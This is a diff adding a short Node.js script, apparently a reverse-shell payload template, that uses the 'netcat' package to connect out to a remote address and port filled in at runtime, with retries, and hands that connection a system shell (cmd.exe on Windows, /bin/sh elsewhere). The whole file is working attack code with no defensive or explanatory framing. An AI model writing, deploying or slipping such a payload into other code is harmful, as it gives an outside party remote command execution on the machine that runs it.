@@ -1,0 +1,20 @@
+var NetcatClient = require('netcat').client
+
+var nc = new NetcatClient()
+var cmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
+
+// %%bookmark%% are replaced at runtime.
+var RHOST = %%addr%%
+var RPORT = %%port%%
+var RETRY = %%retry%%
+
+nc.addr(RHOST).port(RPORT).retry(RETRY).connect().exec(cmd)
+
+nc.on('data', function(data){
+  // TODO: piped and captured too?
+  if (data.toString().indexOf('shx') === 0){
+    console.log('Cross-platform command!')
+  }
+})
+
+// TODO: implement pipe "filter" on netcat.. through2...
